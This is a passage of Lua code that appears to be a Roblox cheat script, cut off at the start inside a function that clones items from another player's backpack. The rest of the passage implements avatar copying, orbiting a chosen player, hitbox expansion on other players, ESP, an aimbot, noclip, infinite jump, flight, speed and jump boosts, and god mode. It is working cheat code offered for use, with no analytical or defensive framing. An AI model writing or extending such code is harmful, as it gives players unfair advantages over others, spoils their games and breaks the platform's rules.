        for _, item in pairs(targetBackpack:GetChildren()) do
            pcall(function()
                local clonedItem = item:Clone()
                clonedItem.Parent = myBackpack
                itemsCopied = itemsCopied + 1
            end)
        end
        
        if SelectedPlayer.Character then
            for _, item in pairs(SelectedPlayer.Character:GetChildren()) do
                if item:IsA("Tool") or item:IsA("HopperBin") or item:IsA("BackpackItem") then
                    pcall(function()
                        local clonedItem = item:Clone()
                        clonedItem.Parent = myBackpack
                        itemsCopied = itemsCopied + 1
                    end)
                end
            end
        end
        
        Library:Notify(string.format("Copied %d items from %s's backpack", itemsCopied, SelectedPlayer.Name), 3)
    end
end
end)
PlayerActionsGroupBox:AddButton("Copy Player Avatar", function()
if SelectedPlayer and SelectedPlayer.Character and LocalPlayer.Character then
for _, obj in pairs(SelectedPlayer.Character:GetChildren()) do
if obj:IsA("Accessory") or obj:IsA("Hat") or obj:IsA("Shirt") or obj:IsA("Pants") then
local clone = obj:Clone()
for _, myObj in pairs(LocalPlayer.Character:GetChildren()) do
if myObj:IsA(obj.ClassName) then
myObj:Destroy()
end
end
clone.Parent = LocalPlayer.Character
end
end
    local targetBodyColors = SelectedPlayer.Character:FindFirstChild("Body Colors")
    local myBodyColors = LocalPlayer.Character:FindFirstChild("Body Colors")
    if targetBodyColors and myBodyColors then
        myBodyColors.HeadColor = targetBodyColors.HeadColor
        myBodyColors.LeftArmColor = targetBodyColors.LeftArmColor
        myBodyColors.LeftLegColor = targetBodyColors.LeftLegColor
        myBodyColors.RightArmColor = targetBodyColors.RightArmColor
        myBodyColors.RightLegColor = targetBodyColors.RightLegColor
        myBodyColors.TorsoColor = targetBodyColors.TorsoColor
    end
end
end)
local Orbiting = false
local OrbitAngle = 0
PlayerActionsGroupBox:AddToggle("OrbitPlayer", {
Text = "Orbit Around Player",
Default = false,
Callback = function(value)
Orbiting = value
if value then
spawn(function()
while Orbiting do
if SelectedPlayer and SelectedPlayer.Character and LocalPlayer.Character then
local targetHRP = SelectedPlayer.Character:FindFirstChild("HumanoidRootPart")
local myHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
if targetHRP and myHRP then
OrbitAngle = OrbitAngle + 0.05
local offset = CFrame.new(math.cos(OrbitAngle) * 8, 0, math.sin(OrbitAngle) * 8)
myHRP.CFrame = targetHRP.CFrame * offset * CFrame.Angles(0, OrbitAngle + math.rad(90), 0)
end
end
task.wait()
end
end)
end
end
})
for _, player in pairs(Players:GetPlayers()) do
if player ~= LocalPlayer then
CreateESP(player)
    if HitboxExpanderEnabled and player.Character then
        local hrp = player.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            if not OriginalHitboxSizes[player] then
                OriginalHitboxSizes[player] = hrp.Size
            end
            hrp.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
            hrp.Transparency = HitboxTransparency
        end
    end
end
end
Players.PlayerAdded:Connect(function(player)
CreateESP(player)
player.CharacterAdded:Connect(function(character)
    task.wait(0.5)
    if HitboxExpanderEnabled then
        local hrp = character:FindFirstChild("HumanoidRootPart")
        if hrp then
            if not OriginalHitboxSizes[player] then
                OriginalHitboxSizes[player] = hrp.Size
            end
            hrp.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
            hrp.Transparency = HitboxTransparency
        end
    end
end)
end)
Players.PlayerRemoving:Connect(function(player)
RemoveESP(player)
OriginalHitboxSizes[player] = nil
end)
RunService.RenderStepped:Connect(function()
UpdateESP()
if aimbotSettings.enabled then
    currentTarget = getClosestPlayerToCenter()
    if currentTarget then
        aimAtTarget(currentTarget)
    end
end

updateFovCircle()
end)
RunService.Heartbeat:Connect(function()
if HitboxExpanderEnabled then
for _, player in pairs(Players:GetPlayers()) do
if player ~= LocalPlayer and player.Character then
local hrp = player.Character:FindFirstChild("HumanoidRootPart")
if hrp then
if not OriginalHitboxSizes[player] then
OriginalHitboxSizes[player] = hrp.Size
end
                hrp.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
                hrp.Transparency = HitboxTransparency
            end
        end
    end
end
end)
RunService.Stepped:Connect(function()
if NoClipEnabled and LocalPlayer.Character then
for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
if part:IsA("BasePart") then
part.CanCollide = false
end
end
end
end)
UserInputService.JumpRequest:Connect(function()
if InfiniteJumpEnabled and LocalPlayer.Character then
local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
if humanoid then
humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
end
end
end)
local function StartFlight()
if not flying or not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
return
end
local hrp = LocalPlayer.Character.HumanoidRootPart
local bg = Instance.new("BodyGyro")
bg.P = 9e4
bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
bg.cframe = hrp.CFrame
bg.Parent = hrp

local bv = Instance.new("BodyVelocity")
bv.velocity = Vector3.new(0, 0, 0)
bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
bv.Parent = hrp

flyingConnection = RunService.RenderStepped:Connect(function()
    if not flying then
        bg:Destroy()
        bv:Destroy()
        if flyingConnection then
            flyingConnection:Disconnect()
        end
        return
    end
    
    local cam = workspace.CurrentCamera
    local moveDirection = Vector3.new(0, 0, 0)
    
    if UserInputService:IsKeyDown(Enum.KeyCode.W) then
        moveDirection = moveDirection + (cam.CFrame.LookVector * FlightSpeed)
    end
    if UserInputService:IsKeyDown(Enum.KeyCode.S) then
        moveDirection = moveDirection - (cam.CFrame.LookVector * FlightSpeed)
    end
    if UserInputService:IsKeyDown(Enum.KeyCode.A) then
        moveDirection = moveDirection - (cam.CFrame.RightVector * FlightSpeed)
    end
    if UserInputService:IsKeyDown(Enum.KeyCode.D) then
        moveDirection = moveDirection + (cam.CFrame.RightVector * FlightSpeed)
    end
    if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
        moveDirection = moveDirection + (Vector3.new(0, FlightSpeed, 0))
    end
    if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
        moveDirection = moveDirection - (Vector3.new(0, FlightSpeed, 0))
    end
    
    bv.velocity = moveDirection
    bg.cframe = cam.CFrame
end)
end
UserInputService.InputBegan:Connect(function(input, gameProcessed)
if gameProcessed then return end
if input.KeyCode == Enum.KeyCode.E and FlightEnabled then
    flying = not flying
    if flying then
        StartFlight()
    end
end
end)
LocalPlayer.CharacterAdded:Connect(function(character)
task.wait(0.5)
local humanoid = character:WaitForChild("Humanoid")

if WalkSpeedEnabled then
    humanoid.WalkSpeed = CustomWalkSpeed
end

if JumpPowerEnabled then
    humanoid.JumpPower = CustomJumpPower
end

if GodModeEnabled then
    humanoid.MaxHealth = math.huge
    humanoid.Health = math.huge
end
end)
ThemeManager:LoadDefault()
